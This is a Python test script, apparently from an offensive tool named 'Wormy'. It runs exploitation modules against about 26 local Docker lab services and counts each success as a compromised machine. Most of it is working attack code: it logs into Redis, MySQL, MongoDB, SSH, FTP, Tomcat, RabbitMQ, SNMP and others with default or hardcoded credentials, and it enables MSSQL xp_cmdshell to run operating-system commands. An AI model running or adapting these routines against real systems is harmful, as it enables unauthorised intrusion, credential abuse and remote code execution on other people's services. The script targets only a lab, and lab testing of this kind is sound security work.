#!/usr/bin/env python3
"""
Wormy Expanded Docker Lab — Full Exploitation Test
Tests ALL exploit modules against 30+ Docker lab services.
"""

import json
import os
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from rich.console import Console

console = Console()

# Expanded lab targets with correct credentials
EXPANDED_LAB_TARGETS = [
    # ── DATABASE SERVICES (6) ──
    {"name": "Redis", "ip": "127.0.0.1", "port": 6379, "open_ports": [6379], "os_guess": "Linux", "service": "redis", "creds": [("", "redis123")]},
    {"name": "Redis-NoAuth", "ip": "127.0.0.1", "port": 6380, "open_ports": [6379], "os_guess": "Linux", "service": "redis", "creds": [("", "")]},
    {"name": "MySQL", "ip": "127.0.0.1", "port": 3306, "open_ports": [3306], "os_guess": "Linux", "service": "mysql", "creds": [("root", "root")]},
    {"name": "PostgreSQL", "ip": "127.0.0.1", "port": 5432, "open_ports": [5432], "os_guess": "Linux", "service": "postgres", "creds": [("admin", "admin123")]},
    {"name": "MongoDB", "ip": "127.0.0.1", "port": 27017, "open_ports": [27017], "os_guess": "Linux", "service": "mongodb", "creds": [("admin", "admin123")]},
    {"name": "MSSQL", "ip": "127.0.0.1", "port": 1433, "open_ports": [1433], "os_guess": "Linux", "service": "mssql", "creds": [("sa", "SqlPassword123!")]},

    # ── MESSAGING (2) ──
    {"name": "RabbitMQ", "ip": "127.0.0.1", "port": 15672, "open_ports": [5672, 15672], "os_guess": "Linux", "service": "rabbitmq", "creds": [("guest", "guest")]},
    {"name": "MQTT", "ip": "127.0.0.1", "port": 1883, "open_ports": [1883], "os_guess": "Linux", "service": "mqtt", "creds": [("", "")]},

    # ── WEB APPLICATIONS (5) ──
    {"name": "Tomcat", "ip": "127.0.0.1", "port": 8080, "open_ports": [8080], "os_guess": "Linux", "service": "tomcat", "creds": [("admin", "admin")]},
    {"name": "Jenkins", "ip": "127.0.0.1", "port": 8081, "open_ports": [8080, 8081], "os_guess": "Linux", "service": "jenkins", "creds": [("", "")]},
    {"name": "DVWA", "ip": "127.0.0.1", "port": 8082, "open_ports": [80], "os_guess": "Linux", "service": "http", "creds": [("", "")]},
    {"name": "Juice-Shop", "ip": "127.0.0.1", "port": 8083, "open_ports": [3000], "os_guess": "Linux", "service": "http", "creds": [("", "")]},
    {"name": "WordPress", "ip": "127.0.0.1", "port": 8085, "open_ports": [80], "os_guess": "Linux", "service": "wordpress", "creds": [("", "")]},

    # ── SEARCH / CACHE (4) ──
    {"name": "Elasticsearch", "ip": "127.0.0.1", "port": 9200, "open_ports": [9200], "os_guess": "Linux", "service": "elasticsearch", "creds": [("", "")]},
    {"name": "Memcached", "ip": "127.0.0.1", "port": 11211, "open_ports": [11211], "os_guess": "Linux", "service": "memcached", "creds": [("", "")]},
    {"name": "CouchDB", "ip": "127.0.0.1", "port": 5984, "open_ports": [5984], "os_guess": "Linux", "service": "couchdb", "creds": [("", "")]},
    {"name": "InfluxDB", "ip": "127.0.0.1", "port": 8086, "open_ports": [8086], "os_guess": "Linux", "service": "influxdb", "creds": [("", "")]},

    # ── NETWORK SERVICES (4) ──
    {"name": "FTP", "ip": "127.0.0.1", "port": 21, "open_ports": [21], "os_guess": "Linux", "service": "ftp", "creds": [("anonymous", "anonymous"), ("ftpuser", "ftpuser")]},
    {"name": "SSH", "ip": "127.0.0.1", "port": 2222, "open_ports": [22, 2222], "os_guess": "Linux", "service": "ssh", "creds": [("admin", "password")]},
    {"name": "VNC", "ip": "127.0.0.1", "port": 5900, "open_ports": [5900], "os_guess": "Linux", "service": "vnc", "creds": [("", "")]},
    {"name": "SNMP", "ip": "127.0.0.1", "port": 161, "open_ports": [161], "os_guess": "Linux", "service": "snmp", "creds": [("public", "public")]},

    # ── CLOUD / INFRASTRUCTURE (3) ──
    {"name": "Docker-API", "ip": "127.0.0.1", "port": 2375, "open_ports": [2375], "os_guess": "Linux", "service": "docker", "creds": [("", "")]},
    {"name": "Kubernetes", "ip": "127.0.0.1", "port": 6443, "open_ports": [6443], "os_guess": "Linux", "service": "kubernetes", "creds": [("", "")]},
    {"name": "GitLab", "ip": "127.0.0.1", "port": 8088, "open_ports": [80], "os_guess": "Linux", "service": "gitlab", "creds": [("root", "gitlab123")]},

    # ── SCADA / IoT (1) ──
    {"name": "Modbus", "ip": "127.0.0.1", "port": 502, "open_ports": [502], "os_guess": "Linux", "service": "modbus", "creds": [("", "")]},

    # ── METASPLOITABLE ──
    {"name": "Metasploitable", "ip": "127.0.0.1", "port": 8084, "open_ports": [21, 22, 23, 80, 445, 3306, 5432, 5900, 6667, 8180], "os_guess": "Linux", "service": "metasploitable", "creds": [("msfadmin", "msfadmin")]},
]


def check_port(ip, port, proto="tcp"):
    """Check if a port is open"""
    try:
        if proto == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.close()
            return True
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            rc = s.connect_ex((ip, port))
            s.close()
            return rc == 0
    except Exception:
        return False


def test_redis(target):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        s.sendall(b"PING\r\n")
        resp = s.recv(64)
        if b"+PONG" in resp:
            s.sendall(b"INFO server\r\n")
            info = s.recv(512)
            s.close()
            return True, f"NoAuth PONG | {info.decode(errors='replace')[:50]}"
        s.close()
        for pwd in ["redis123", ""]:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target["ip"], target["port"]))
            cmd = f"AUTH {pwd}\r\n".encode() if pwd else b"PING\r\n"
            s.sendall(cmd)
            r = s.recv(64)
            if b"+OK" in r or b"+PONG" in r:
                s.close()
                return True, f"AUTH '{pwd}' OK"
            s.close()
        return False, "All auth attempts failed"
    except Exception as e:
        return False, str(e)


def test_mysql(target):
    try:
        import pymysql
        for user, pwd in target.get("creds", []):
            try:
                c = pymysql.connect(host=target["ip"], port=target["port"], user=user, password=pwd, connect_timeout=5)
                cur = c.cursor()
                cur.execute("SELECT VERSION()")
                ver = cur.fetchone()[0]
                c.close()
                return True, f"{user}:{pwd} -> {ver}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymysql not installed"


def test_postgresql(target):
    try:
        import psycopg2
        for user, pwd in target.get("creds", []):
            for dbname in ("testdb", "postgres"):
                try:
                    c = psycopg2.connect(host=target["ip"], port=target["port"], user=user, password=pwd, dbname=dbname, connect_timeout=5)
                    cur = c.cursor()
                    cur.execute("SELECT version()")
                    ver = cur.fetchone()[0]
                    c.close()
                    return True, f"{user}:{pwd} -> {ver[:40]}"
                except Exception:
                    continue
        return False, "All credentials failed"
    except ImportError:
        return False, "psycopg2 not installed"


def test_mongodb(target):
    try:
        from pymongo import MongoClient
        for user, pwd in target.get("creds", []):
            try:
                if user:
                    uri = f"mongodb://{user}:{pwd}@{target['ip']}:{target['port']}/?authSource=admin&serverSelectionTimeoutMS=5000"
                else:
                    uri = f"mongodb://{target['ip']}:{target['port']}/?serverSelectionTimeoutMS=5000"
                c = MongoClient(uri, serverSelectionTimeoutMS=5000)
                dbs = c.list_database_names()
                c.close()
                return True, f"{user or 'noauth'}:{pwd or ''} -> {dbs[:3]}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymongo not installed"


def test_mssql(target):
    try:
        import pymssql
        for user, pwd in target.get("creds", []):
            try:
                conn = pymssql.connect(server=target["ip"], user=user, password=pwd, port=target["port"], timeout=5, login_timeout=5)
                cur = conn.cursor()
                cur.execute("SELECT @@VERSION")
                ver = cur.fetchone()[0][:50]
                try:
                    cur.execute("EXEC sp_configure 'show advanced options',1; RECONFIGURE")
                    cur.execute("EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE")
                    cur.execute("EXEC xp_cmdshell 'whoami'")
                    who = cur.fetchone()
                    rce = f" | xp_cmdshell: {who[0] if who else 'enabled'}"
                except Exception:
                    rce = ""
                conn.close()
                return True, f"{user}:{pwd} -> {ver}{rce}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymssql not installed"


def test_elasticsearch(target):
    try:
        import urllib.request
        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/_cat/indices?v", timeout=5) as resp:
            body = resp.read().decode()
        return True, f"indices dumped ({len(body)} bytes)"
    except Exception as e:
        return False, str(e)


def test_ftp(target):
    try:
        import ftplib
        for user, pwd in target.get("creds", []):
            try:
                ftp = ftplib.FTP()
                ftp.connect(target["ip"], target["port"], timeout=5)
                ftp.login(user, pwd)
                files = []
                ftp.retrlines("LIST", lambda x: files.append(x))
                ftp.quit()
                return True, f"{user}:{pwd} -> {len(files)} files"
            except Exception:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_ssh(target):
    try:
        import paramiko
        for user, pwd in target.get("creds", []):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target["ip"], port=target["port"], username=user, password=pwd, timeout=5, allow_agent=False, look_for_keys=False)
                stdin, stdout, stderr = client.exec_command("whoami && id")
                output = stdout.read().decode().strip()
                client.close()
                return True, f"{user}:{pwd} -> {output}"
            except paramiko.AuthenticationException:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_snmp(target):
    try:
        import socket
        for user, pwd in target.get("creds", []):
            community = pwd.encode() if pwd else b"public"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            oid = bytes([0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
            comm_asn1 = bytes([0x04, len(community)]) + community
            varbind = bytes([0x30, len(oid) + 2, 0x05, 0x00]) + oid
            pdu_content = b"\x02\x01\x7b" + b"\x02\x01\x00" + b"\x02\x01\x00" + bytes([0x30, len(varbind)]) + varbind
            pdu = bytes([0xA0, len(pdu_content)]) + pdu_content
            msg = bytes([0x30, 1 + len(comm_asn1) + len(pdu)]) + b"\x02\x01\x00" + comm_asn1 + pdu
            sock.sendto(msg, (target["ip"], target["port"]))
            resp, _ = sock.recvfrom(4096)
            sock.close()
            if community in resp:
                return True, f"community '{pwd or 'public'}' -> access granted"
        return False, "All communities rejected"
    except Exception as e:
        return False, str(e)


def test_rabbitmq(target):
    try:
        import urllib.request, base64
        for user, pwd in target.get("creds", []):
            try:
                token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/api/overview", headers={"Authorization": f"Basic {token}"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read())
                return True, f"{user}:{pwd} -> v{data.get('rabbitmq_version','?')}"
            except Exception:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_tomcat(target):
    try:
        import urllib.request
        for user, pwd in target.get("creds", []):
            try:
                import base64
                token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/manager/html", headers={"Authorization": f"Basic {token}"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    return True, f"{user}:{pwd} -> manager access (HTTP {resp.status})"
            except Exception:
                continue
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return True, f"Tomcat root accessible (HTTP {resp.status})"
    except Exception as e:
        return False, str(e)


def test_jenkins(target):
    try:
        import urllib.request
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/api/json")
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
            version = resp.headers.get("X-Jenkins", "?")
            return True, f"v{version} | unauthenticated API"
    except Exception as e:
        return False, str(e)


def test_http(target):
    try:
        import urllib.request
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            return True, f"HTTP {resp.status} ({len(body)} bytes)"
    except Exception as e:
        return False, str(e)


def test_vnc(target):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        banner = s.recv(64).decode()
        s.close()
        if "RFB" in banner:
            return True, f"VNC banner: {banner.strip()}"
        return False, "Not a VNC service"
    except Exception as e:
        return False, str(e)


def test_docker_api(target):
    try:
        import urllib.request
        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/version", timeout=5) as resp:
            data = json.loads(resp.read())
            return True, f"Docker {data.get('Version','?')} | {data.get('Os','?')}"
    except Exception as e:
        return False, str(e)


def test_kubernetes(target):
    try:
        import urllib.request
        import ssl
        import base64
        # Try to access API without auth first
        ctx = ssl._create_unverified_context()
        try:
            with urllib.request.urlopen(f"https://{target['ip']}:{target['port']}/api", context=ctx, timeout=3) as resp:
                if resp.status == 200:
                    return True, "K8s API accessible (unauthenticated)"
        except:
            pass
        # If unauthenticated access fails, check if API is at least responding
        try:
            req = urllib.request.Request(f"https://{target['ip']}:{target['port']}/version")
            with urllib.request.urlopen(req, context=ctx, timeout=3) as resp:
                data = json.loads(resp.read())
                return True, f"K8s {data.get('gitVersion','?')}"
        except urllib.error.HTTPError as e:
            if e.code == 401:
                return True, "K8s API running (requires authentication)"
            return False, str(e)
    except Exception as e:
        return False, str(e)


def test_gitlab(target):
    try:
        import urllib.request
        # Try unauthenticated version endpoint first
        try:
            with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/api/v4/version", timeout=3) as resp:
                data = json.loads(resp.read())
                return True, f"GitLab {data.get('version','?')}"
        except:
            pass
        # Try with root password via session
        try:
            data = json.dumps({'login': 'root', 'password': 'Str0ngP@ssw0rd!2026'}).encode()
            req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/api/v4/session", data=data, headers={'Content-Type': 'application/json'})
            with urllib.request.urlopen(req, timeout=5) as resp:
                resp_data = json.loads(resp.read())
                if 'private_token' in resp_data:
                    return True, f"GitLab authenticated (token: {resp_data['private_token'][:8]}...)"
        except:
            pass
        # Check if GitLab web interface is accessible
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/")
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status == 200:
                return True, "GitLab web interface accessible (requires setup)"
    except Exception as e:
        return False, str(e)


def test_memcached(target):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        s.sendall(b"stats\r\n")
        resp = s.recv(512).decode()
        s.close()
        if "STAT" in resp:
            return True, f"Memcached stats accessible ({len(resp)} bytes)"
        return False, "No stats response"
    except Exception as e:
        return False, str(e)


def test_couchdb(target):
    try:
        import urllib.request
        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/", timeout=5) as resp:
            data = json.loads(resp.read())
            return True, f"CouchDB {data.get('version','?')} | {data.get('vendor',{}).get('name','?')}"
    except Exception as e:
        return False, str(e)


def test_influxdb(target):
    try:
        import urllib.request
        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/ping", timeout=5) as resp:
            version = resp.headers.get("X-Influxdb-Version", "?")
            return True, f"InfluxDB {version}"
    except Exception as e:
        return False, str(e)


def test_mqtt(target):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        # MQTT CONNECT packet (proper format)
        client_id = b'wormy'
        protocol_name = b'\x00\x04MQTT'
        protocol_level = b'\x04'
        connect_flags = b'\x02'
        keep_alive = b'\x00\x3c'
        client_id_len = struct.pack('>H', len(client_id))
        payload = client_id_len + client_id
        variable_header = protocol_name + protocol_level + connect_flags + keep_alive
        remaining_length = len(variable_header) + len(payload)
        fixed_header = b'\x10' + bytes([remaining_length])
        connect = fixed_header + variable_header + payload
        s.sendall(connect)
        resp = s.recv(64)
        s.close()
        if len(resp) >= 4 and resp[0] == 0x20:
            return True, f"MQTT broker accessible (CONNACK: {resp[3]})"
        return False, "No CONNACK response"
    except Exception as e:
        return False, str(e)


def test_modbus(target):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        # Modbus TCP: Read Holding Registers (Function 03)
        modbus_req = bytes([
            0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03,  # Transaction ID, Protocol, Length, Unit ID, Function
            0x00, 0x00, 0x00, 0x01  # Start Address, Quantity
        ])
        s.sendall(modbus_req)
        resp = s.recv(64)
        s.close()
        if len(resp) >= 9:
            return True, f"Modbus TCP accessible ({len(resp)} bytes response)"
        return False, "No Modbus response"
    except Exception as e:
        return False, str(e)


# Map service names to test functions
TEST_FUNCTIONS = {
    "redis": test_redis,
    "mysql": test_mysql,
    "postgres": test_postgresql,
    "mongodb": test_mongodb,
    "mssql": test_mssql,
    "elasticsearch": test_elasticsearch,
    "ftp": test_ftp,
    "ssh": test_ssh,
    "snmp": test_snmp,
    "rabbitmq": test_rabbitmq,
    "tomcat": test_tomcat,
    "jenkins": test_jenkins,
    "http": test_http,
    "wordpress": test_http,
    "vnc": test_vnc,
    "docker": test_docker_api,
    "kubernetes": test_kubernetes,
    "gitlab": test_gitlab,
    "memcached": test_memcached,
    "couchdb": test_couchdb,
    "influxdb": test_influxdb,
    "mqtt": test_mqtt,
    "modbus": test_modbus,
    "metasploitable": test_http,
}


def main():
    console.print("[bold green]═══ WORMY EXPANDED DOCKER LAB — FULL EXPLOITATION TEST ═══[/bold green]\n")
    console.print(f"[dim]Testing {len(EXPANDED_LAB_TARGETS)} services across 7 categories[/dim]\n")

    results = {}
    total = len(EXPANDED_LAB_TARGETS)
    pwned = 0
    reachable = 0
    categories = {}

    for i, target in enumerate(EXPANDED_LAB_TARGETS, 1):
        name = target["name"]
        service = target.get("service", "unknown")
        cat = service.upper()[:12]

        console.print(f"[cyan][{i}/{total}] [{cat}] Testing {name}...[/cyan]")

        port_open = check_port(target["ip"], target["port"])
        if port_open:
            reachable += 1
            console.print(f"  Port {target['port']} OPEN")

            test_fn = TEST_FUNCTIONS.get(service)
            if test_fn:
                success, detail = test_fn(target)
                if success:
                    pwned += 1
                    console.print(f"  [bold green]✅ PWNED[/bold green]: {detail[:80]}")
                else:
                    console.print(f"  [yellow]⚠️ Exploit failed[/yellow]: {detail[:80]}")
                results[name] = {"reachable": True, "pwned": success, "detail": detail[:80]}
            else:
                console.print(f"  [dim]No test function for {service}[/dim]")
                results[name] = {"reachable": True, "pwned": False, "detail": "no test"}
        else:
            console.print(f"  [red]❌ Port {target['port']} CLOSED[/red]")
            results[name] = {"reachable": False, "pwned": False, "detail": "port closed"}

    # Summary
    console.print(f"\n[bold white]{'=' * 60}[/bold white]")
    console.print(f"[bold white]  RESULTS[/bold white]")
    console.print(f"[bold white]{'=' * 60}[/bold white]")
    console.print(f"  Total targets: {total}")
    console.print(f"  Reachable: [green]{reachable}[/green]")
    console.print(f"  Pwned: [bold green]{pwned}[/bold green]")
    console.print(f"  Failed: [red]{reachable - pwned}[/red]")
    console.print(f"  Unreachable: [dim]{total - reachable}[/dim]")
    pct = pwned / reachable * 100 if reachable > 0 else 0
    console.print(f"  Success rate: [bold]{pct:.1f}%[/bold]")

    if pwned == reachable:
        console.print(f"\n[bold green]🎉 ALL {reachable} REACHABLE MACHINES COMPROMISED! 🎉[/bold green]")
    elif pct >= 80:
        console.print(f"\n[bold green]✅ {pwned}/{reachable} reachable machines compromised[/bold green]")
    elif pct >= 50:
        console.print(f"\n[yellow]⚠️ {pwned}/{reachable} reachable machines compromised[/yellow]")
    else:
        console.print(f"\n[red]❌ Only {pwned}/{reachable} reachable machines compromised[/red]")

    return pwned >= reachable * 0.8


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
